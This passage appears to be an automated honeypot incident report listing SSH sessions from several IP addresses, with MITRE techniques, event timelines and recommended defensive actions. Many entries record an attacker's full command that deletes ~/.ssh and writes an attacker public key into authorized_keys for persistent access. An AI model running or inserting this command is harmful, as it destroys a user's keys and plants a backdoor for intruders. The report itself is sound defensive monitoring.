| `2026-04-20 19:53:45` | `cowrie.session.params` |
| `2026-04-20 19:53:45` | `cowrie.command.input` |
| `2026-04-20 19:53:45` | `cowrie.command.failed` |
| `2026-04-20 19:53:45` | `cowrie.log.closed` |
| `2026-04-20 19:53:45` | `cowrie.session.params` |
| `2026-04-20 19:53:45` | `cowrie.command.input` |
| `2026-04-20 19:53:45` | `cowrie.session.file_download` |
| `2026-04-20 19:53:45` | `cowrie.log.closed` |
| `2026-04-20 19:53:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-986f0549acb9

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 19:53 |
| **Last Seen** | 2026-04-20 19:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:53:46` | `cowrie.session.connect` |
| `2026-04-20 19:53:46` | `cowrie.client.version` |
| `2026-04-20 19:53:46` | `cowrie.client.kex` |
| `2026-04-20 19:53:47` | `cowrie.login.success` |
| `2026-04-20 19:53:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8989ac8b3e1

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 19:53 |
| **Last Seen** | 2026-04-20 19:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:53:47` | `cowrie.session.connect` |
| `2026-04-20 19:53:47` | `cowrie.client.version` |
| `2026-04-20 19:53:47` | `cowrie.client.kex` |
| `2026-04-20 19:53:48` | `cowrie.login.success` |
| `2026-04-20 19:53:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fce442d0f4d

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 19:55 |
| **Last Seen** | 2026-04-20 19:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:55:03` | `cowrie.session.connect` |
| `2026-04-20 19:55:03` | `cowrie.client.version` |
| `2026-04-20 19:55:03` | `cowrie.client.kex` |
| `2026-04-20 19:55:04` | `cowrie.login.success` |
| `2026-04-20 19:55:04` | `cowrie.session.params` |
| `2026-04-20 19:55:04` | `cowrie.command.input` |
| `2026-04-20 19:55:04` | `cowrie.command.failed` |
| `2026-04-20 19:55:04` | `cowrie.log.closed` |
| `2026-04-20 19:55:05` | `cowrie.session.params` |
| `2026-04-20 19:55:05` | `cowrie.command.input` |
| `2026-04-20 19:55:05` | `cowrie.session.file_download` |
| `2026-04-20 19:55:05` | `cowrie.log.closed` |
| `2026-04-20 19:55:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daab6e0e4be3

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 19:55 |
| **Last Seen** | 2026-04-20 19:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:55:07` | `cowrie.session.connect` |
| `2026-04-20 19:55:07` | `cowrie.client.version` |
| `2026-04-20 19:55:07` | `cowrie.client.kex` |
| `2026-04-20 19:55:08` | `cowrie.login.success` |
| `2026-04-20 19:55:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1da32dffd8a7

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 19:55 |
| **Last Seen** | 2026-04-20 19:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:55:15` | `cowrie.session.connect` |
| `2026-04-20 19:55:15` | `cowrie.client.version` |
| `2026-04-20 19:55:15` | `cowrie.client.kex` |
| `2026-04-20 19:55:16` | `cowrie.login.success` |
| `2026-04-20 19:55:16` | `cowrie.session.params` |
| `2026-04-20 19:55:16` | `cowrie.command.input` |
| `2026-04-20 19:55:16` | `cowrie.command.failed` |
| `2026-04-20 19:55:16` | `cowrie.log.closed` |
| `2026-04-20 19:55:17` | `cowrie.session.params` |
| `2026-04-20 19:55:17` | `cowrie.command.input` |
| `2026-04-20 19:55:17` | `cowrie.session.file_download` |
| `2026-04-20 19:55:17` | `cowrie.log.closed` |
| `2026-04-20 19:55:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5fdcd874895

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 19:55 |
| **Last Seen** | 2026-04-20 19:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:55:19` | `cowrie.session.connect` |
| `2026-04-20 19:55:19` | `cowrie.client.version` |
| `2026-04-20 19:55:19` | `cowrie.client.kex` |
| `2026-04-20 19:55:19` | `cowrie.login.success` |
| `2026-04-20 19:55:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfa361cb859e

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 19:55 |
| **Last Seen** | 2026-04-20 19:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:55:26` | `cowrie.session.connect` |
| `2026-04-20 19:55:26` | `cowrie.client.version` |
| `2026-04-20 19:55:26` | `cowrie.client.kex` |
| `2026-04-20 19:55:27` | `cowrie.login.success` |
| `2026-04-20 19:55:28` | `cowrie.session.params` |
| `2026-04-20 19:55:28` | `cowrie.command.input` |
| `2026-04-20 19:55:28` | `cowrie.command.failed` |
| `2026-04-20 19:55:28` | `cowrie.log.closed` |
| `2026-04-20 19:55:29` | `cowrie.session.params` |
| `2026-04-20 19:55:29` | `cowrie.command.input` |
| `2026-04-20 19:55:29` | `cowrie.session.file_download` |
| `2026-04-20 19:55:29` | `cowrie.log.closed` |
| `2026-04-20 19:55:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1672538aef10

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 19:55 |
| **Last Seen** | 2026-04-20 19:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:55:32` | `cowrie.session.connect` |
| `2026-04-20 19:55:32` | `cowrie.client.version` |
| `2026-04-20 19:55:32` | `cowrie.client.kex` |
| `2026-04-20 19:55:33` | `cowrie.login.success` |
| `2026-04-20 19:55:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3390e3bb4f9

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 19:55 |
| **Last Seen** | 2026-04-20 19:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:55:50` | `cowrie.session.connect` |
| `2026-04-20 19:55:50` | `cowrie.client.version` |
| `2026-04-20 19:55:51` | `cowrie.client.kex` |
| `2026-04-20 19:55:51` | `cowrie.login.success` |
| `2026-04-20 19:55:51` | `cowrie.session.params` |
| `2026-04-20 19:55:51` | `cowrie.command.input` |
| `2026-04-20 19:55:51` | `cowrie.command.failed` |
| `2026-04-20 19:55:52` | `cowrie.log.closed` |
| `2026-04-20 19:55:52` | `cowrie.session.params` |
| `2026-04-20 19:55:52` | `cowrie.command.input` |
| `2026-04-20 19:55:52` | `cowrie.session.file_download` |
| `2026-04-20 19:55:52` | `cowrie.log.closed` |
| `2026-04-20 19:55:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d0d5ff42071

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 19:55 |
| **Last Seen** | 2026-04-20 19:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:55:54` | `cowrie.session.connect` |
| `2026-04-20 19:55:54` | `cowrie.client.version` |
| `2026-04-20 19:55:54` | `cowrie.client.kex` |
| `2026-04-20 19:55:55` | `cowrie.login.success` |
| `2026-04-20 19:55:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-031461c4a864

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 19:56 |
| **Last Seen** | 2026-04-20 19:56 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:56:03` | `cowrie.session.connect` |
| `2026-04-20 19:56:03` | `cowrie.client.version` |
| `2026-04-20 19:56:03` | `cowrie.client.kex` |
| `2026-04-20 19:56:05` | `cowrie.login.success` |
| `2026-04-20 19:56:05` | `cowrie.session.params` |
| `2026-04-20 19:56:05` | `cowrie.command.input` |
| `2026-04-20 19:56:05` | `cowrie.command.failed` |
| `2026-04-20 19:56:06` | `cowrie.log.closed` |
| `2026-04-20 19:56:07` | `cowrie.session.params` |
| `2026-04-20 19:56:07` | `cowrie.command.input` |
| `2026-04-20 19:56:07` | `cowrie.session.file_download` |
| `2026-04-20 19:56:07` | `cowrie.log.closed` |
| `2026-04-20 19:56:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f761685e23d5

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 19:56 |
| **Last Seen** | 2026-04-20 19:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:56:11` | `cowrie.session.connect` |
| `2026-04-20 19:56:11` | `cowrie.client.version` |
| `2026-04-20 19:56:11` | `cowrie.client.kex` |
| `2026-04-20 19:56:13` | `cowrie.login.success` |
| `2026-04-20 19:56:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74b80c7a6f66

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 19:56 |
| **Last Seen** | 2026-04-20 19:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:56:33` | `cowrie.session.connect` |
| `2026-04-20 19:56:33` | `cowrie.client.version` |
| `2026-04-20 19:56:33` | `cowrie.client.kex` |
| `2026-04-20 19:56:34` | `cowrie.login.success` |
| `2026-04-20 19:56:34` | `cowrie.session.params` |
| `2026-04-20 19:56:34` | `cowrie.command.input` |
| `2026-04-20 19:56:34` | `cowrie.command.failed` |
| `2026-04-20 19:56:34` | `cowrie.log.closed` |
| `2026-04-20 19:56:35` | `cowrie.session.params` |
| `2026-04-20 19:56:35` | `cowrie.command.input` |
| `2026-04-20 19:56:35` | `cowrie.session.file_download` |
| `2026-04-20 19:56:35` | `cowrie.log.closed` |
| `2026-04-20 19:56:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f956f68e5fe8

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 19:56 |
| **Last Seen** | 2026-04-20 19:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:56:37` | `cowrie.session.connect` |
| `2026-04-20 19:56:37` | `cowrie.client.version` |
| `2026-04-20 19:56:37` | `cowrie.client.kex` |
| `2026-04-20 19:56:38` | `cowrie.login.success` |
| `2026-04-20 19:56:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b3b5e4be30e

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 19:56 |
| **Last Seen** | 2026-04-20 19:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:56:42` | `cowrie.session.connect` |
| `2026-04-20 19:56:42` | `cowrie.client.version` |
| `2026-04-20 19:56:43` | `cowrie.client.kex` |
| `2026-04-20 19:56:43` | `cowrie.login.success` |
| `2026-04-20 19:56:43` | `cowrie.session.params` |
| `2026-04-20 19:56:43` | `cowrie.command.input` |
| `2026-04-20 19:56:43` | `cowrie.command.failed` |
| `2026-04-20 19:56:43` | `cowrie.log.closed` |
| `2026-04-20 19:56:44` | `cowrie.session.params` |
| `2026-04-20 19:56:44` | `cowrie.command.input` |
| `2026-04-20 19:56:44` | `cowrie.session.file_download` |
| `2026-04-20 19:56:44` | `cowrie.log.closed` |
| `2026-04-20 19:56:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c5be61ad34c

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 19:56 |
| **Last Seen** | 2026-04-20 19:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:56:46` | `cowrie.session.connect` |
| `2026-04-20 19:56:46` | `cowrie.client.version` |
| `2026-04-20 19:56:51` | `cowrie.client.kex` |
| `2026-04-20 19:56:52` | `cowrie.login.success` |
| `2026-04-20 19:56:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5462587f0581

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 19:57 |
| **Last Seen** | 2026-04-20 19:58 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:57:53` | `cowrie.session.connect` |
| `2026-04-20 19:57:53` | `cowrie.client.version` |
| `2026-04-20 19:57:53` | `cowrie.client.kex` |
| `2026-04-20 19:57:55` | `cowrie.login.success` |
| `2026-04-20 19:57:56` | `cowrie.session.params` |
| `2026-04-20 19:57:56` | `cowrie.command.input` |
| `2026-04-20 19:57:56` | `cowrie.command.failed` |
| `2026-04-20 19:57:56` | `cowrie.log.closed` |
| `2026-04-20 19:57:57` | `cowrie.session.params` |
| `2026-04-20 19:57:57` | `cowrie.command.input` |
| `2026-04-20 19:57:57` | `cowrie.session.file_download` |
| `2026-04-20 19:57:57` | `cowrie.log.closed` |
| `2026-04-20 19:58:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
